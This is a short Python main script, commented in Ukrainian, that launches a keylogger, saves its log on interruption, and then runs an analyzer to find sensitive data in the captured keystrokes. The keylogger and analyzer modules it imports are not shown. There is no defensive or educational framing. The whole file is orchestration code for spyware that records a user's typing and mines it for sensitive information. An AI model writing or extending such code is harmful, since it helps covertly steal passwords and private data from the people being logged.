import os
from config import load_config
from keylogger import Keylogger
from sensitive_analyzer import SensitiveAnalyzer

def start_logging():
    """Основна функція для запуску кейлогера і аналізу чутливих даних."""
    # Завантаження конфігурації
    config = load_config()

    # Створюємо екземпляр класу Keylogger
    keylogger = Keylogger()

    # Запускаємо кейлогер
    print("Запуск кейлогера...")
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("Програма зупинена вручну.")
        keylogger.logger.write_log()

    # Аналіз чутливих даних після завершення
    analyze_sensitive_data()

def analyze_sensitive_data():
    """Функція для аналізу логів і виявлення чутливих даних."""
    print("\nАналіз чутливих даних у логах...")
    analyzer = SensitiveAnalyzer()
    analyzer.analyze()

if __name__ == "__main__":
    # Перевірка існування папки logs, якщо немає - створюємо її
    if not os.path.exists("logs"):
        os.makedirs("logs")

    # Запуск логування і аналізу
    start_logging()
